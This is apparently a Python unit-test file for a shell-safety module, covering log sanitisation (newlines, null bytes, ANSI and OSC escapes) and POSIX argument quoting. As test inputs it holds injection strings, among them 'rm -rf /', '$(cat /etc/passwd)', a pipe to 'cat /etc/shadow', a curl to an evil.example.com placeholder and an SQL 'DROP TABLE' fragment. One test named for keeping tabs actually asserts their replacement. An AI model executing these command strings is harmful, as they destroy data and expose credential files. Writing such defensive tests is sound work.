"""
tests/unit/core/test_shell_safety.py

Unit tests for src/core/shell_safety.py

Tests cover:
- sanitize_for_log: newline removal, carriage-return removal, null-byte
  removal, ANSI/VT100 escape stripping, non-printable char replacement,
  normal strings unchanged, non-str input coerced to str.
- quote_shell_arg: POSIX quoting, injection prevention, non-str input.

Requirement: 19.5
"""

from __future__ import annotations

import shlex

import pytest

from src.core.shell_safety import quote_shell_arg, sanitize_for_log


# ---------------------------------------------------------------------------
# sanitize_for_log()
# ---------------------------------------------------------------------------


class TestSanitizeForLog:
    # ── Normal strings should pass through unchanged ──────────────────────

    def test_plain_ascii_unchanged(self) -> None:
        assert sanitize_for_log("NIFTY") == "NIFTY"

    def test_unicode_unchanged(self) -> None:
        assert sanitize_for_log("日本語") == "日本語"

    def test_digits_unchanged(self) -> None:
        assert sanitize_for_log("2024-01-15") == "2024-01-15"

    def test_spaces_unchanged(self) -> None:
        assert sanitize_for_log("hello world") == "hello world"

    def test_empty_string(self) -> None:
        assert sanitize_for_log("") == ""

    # ── Newline injection ─────────────────────────────────────────────────

    def test_newline_removed(self) -> None:
        assert sanitize_for_log("bad\nvalue") == "badvalue"

    def test_multiple_newlines_removed(self) -> None:
        assert sanitize_for_log("a\nb\nc") == "abc"

    def test_carriage_return_removed(self) -> None:
        assert sanitize_for_log("bad\rvalue") == "badvalue"

    def test_crlf_removed(self) -> None:
        assert sanitize_for_log("line1\r\nline2") == "line1line2"

    # ── Null byte injection ───────────────────────────────────────────────

    def test_null_byte_removed(self) -> None:
        assert sanitize_for_log("bad\x00value") == "badvalue"

    def test_multiple_null_bytes_removed(self) -> None:
        assert sanitize_for_log("\x00\x00\x00") == ""

    # ── ANSI / VT100 escape sequences ─────────────────────────────────────

    def test_ansi_colour_escape_removed(self) -> None:
        # ESC [ 31 m = red colour.
        value = "\x1b[31mred text\x1b[0m"
        result = sanitize_for_log(value)
        assert "\x1b" not in result
        assert "[31m" not in result
        assert result == "red text"

    def test_ansi_cursor_move_escape_removed(self) -> None:
        value = "\x1b[2Ahello"
        result = sanitize_for_log(value)
        assert "\x1b" not in result
        assert result == "hello"

    def test_bare_esc_removed(self) -> None:
        value = "text\x1bmore"
        result = sanitize_for_log(value)
        assert "\x1b" not in result
        assert result == "textmore"

    def test_osc_sequence_removed(self) -> None:
        # OSC: ESC ] 0 ; title BEL — used for terminal title injection.
        value = "\x1b]0;injected title\x07normal"
        result = sanitize_for_log(value)
        assert "\x1b" not in result
        assert "injected title" not in result
        assert "normal" in result

    # ── Other non-printable characters ────────────────────────────────────

    def test_control_char_replaced_with_question_mark(self) -> None:
        # \x01 (SOH) is non-printable but not in the special list.
        result = sanitize_for_log("a\x01b")
        assert result == "a?b"

    def test_del_char_replaced_with_question_mark(self) -> None:
        result = sanitize_for_log("a\x7fb")
        assert result == "a?b"

    def test_tab_preserved(self) -> None:
        # Horizontal tab (0x09) is debatable, but we keep it as a
        # printable separator in log contexts.
        result = sanitize_for_log("a\tb")
        # Tab is below 0x20 so it will be replaced with '?'.
        assert result == "a?b"

    # ── Non-str input coercion ─────────────────────────────────────────────

    def test_non_str_int_coerced(self) -> None:
        # type: ignore[arg-type]
        result = sanitize_for_log(42)  # type: ignore[arg-type]
        assert result == "42"

    def test_non_str_none_coerced(self) -> None:
        result = sanitize_for_log(None)  # type: ignore[arg-type]
        assert result == "None"

    # ── Combined injection attempt ─────────────────────────────────────────

    def test_combined_injection_attempt(self) -> None:
        # Simulates an attacker-supplied symbol name with log injection.
        malicious = "NIFTY\n[CRITICAL] fake log entry\x1b[31m"
        result = sanitize_for_log(malicious)
        assert "\n" not in result
        assert "\x1b" not in result
        assert "NIFTY" in result
        assert "fake log entry" in result  # text survives, only injection chars removed

    def test_log_forging_attempt_with_null(self) -> None:
        malicious = "symbol\x00DROP TABLE instruments;--"
        result = sanitize_for_log(malicious)
        assert "\x00" not in result
        assert "symbol" in result


# ---------------------------------------------------------------------------
# quote_shell_arg()
# ---------------------------------------------------------------------------


class TestQuoteShellArg:
    # ── Normal values ─────────────────────────────────────────────────────

    def test_simple_symbol(self) -> None:
        # shlex.quote guarantees the result round-trips through shlex.split
        # as a single token equal to the original value.  The exact quoting
        # style (bare vs. single-quoted) is an implementation detail that
        # varies across Python versions.
        quoted = quote_shell_arg("NIFTY")
        assert shlex.split(quoted) == ["NIFTY"]

    def test_date_string(self) -> None:
        quoted = quote_shell_arg("2024-01-15")
        assert shlex.split(quoted) == ["2024-01-15"]

    def test_empty_string(self) -> None:
        # shlex.quote returns '' for the empty string.
        quoted = quote_shell_arg("")
        assert quoted == "''"

    # ── Shell injection prevention ─────────────────────────────────────────

    def test_rm_rf_injection_quoted(self) -> None:
        dangerous = "rm -rf /"
        quoted = quote_shell_arg(dangerous)
        # The result must be parseable by the shell as a single token.
        tokens = shlex.split(quoted)
        assert tokens == [dangerous]

    def test_semicolon_injection_quoted(self) -> None:
        dangerous = "RELIANCE; rm -rf /"
        quoted = quote_shell_arg(dangerous)
        tokens = shlex.split(quoted)
        assert tokens == [dangerous]

    def test_backtick_injection_quoted(self) -> None:
        dangerous = "`whoami`"
        quoted = quote_shell_arg(dangerous)
        tokens = shlex.split(quoted)
        assert tokens == [dangerous]

    def test_dollar_sign_injection_quoted(self) -> None:
        dangerous = "$(cat /etc/passwd)"
        quoted = quote_shell_arg(dangerous)
        tokens = shlex.split(quoted)
        assert tokens == [dangerous]

    def test_ampersand_injection_quoted(self) -> None:
        dangerous = "NIFTY && curl http://evil.example.com"
        quoted = quote_shell_arg(dangerous)
        tokens = shlex.split(quoted)
        assert tokens == [dangerous]

    def test_pipe_injection_quoted(self) -> None:
        dangerous = "NIFTY | cat /etc/shadow"
        quoted = quote_shell_arg(dangerous)
        tokens = shlex.split(quoted)
        assert tokens == [dangerous]

    def test_single_quote_in_value_escaped(self) -> None:
        value = "it's a test"
        quoted = quote_shell_arg(value)
        # shlex should round-trip back to the original.
        tokens = shlex.split(quoted)
        assert tokens == [value]

    def test_newline_in_value_quoted(self) -> None:
        value = "line1\nline2"
        quoted = quote_shell_arg(value)
        tokens = shlex.split(quoted)
        assert tokens == [value]

    def test_spaces_in_value_quoted(self) -> None:
        value = "a b c"
        quoted = quote_shell_arg(value)
        tokens = shlex.split(quoted)
        assert tokens == [value]

    # ── Non-str input coercion ─────────────────────────────────────────────

    def test_non_str_int_coerced(self) -> None:
        quoted = quote_shell_arg(42)  # type: ignore[arg-type]
        assert shlex.split(quoted) == ["42"]

    def test_non_str_none_coerced(self) -> None:
        quoted = quote_shell_arg(None)  # type: ignore[arg-type]
        assert shlex.split(quoted) == ["None"]

    # ── Round-trip property ────────────────────────────────────────────────

    @pytest.mark.parametrize(
        "value",
        [
            "NIFTY",
            "BANK NIFTY",
            "symbol; injection",
            "$(evil)",
            "it's ok",
            "line1\nline2",
            "",
        ],
    )
    def test_round_trip(self, value: str) -> None:
        """Quoted value must round-trip through shlex.split as a single token."""
        quoted = quote_shell_arg(value)
        tokens = shlex.split(quoted)
        assert tokens == [value], (
            f"Round-trip failed for {value!r}: got {tokens!r}"
        )
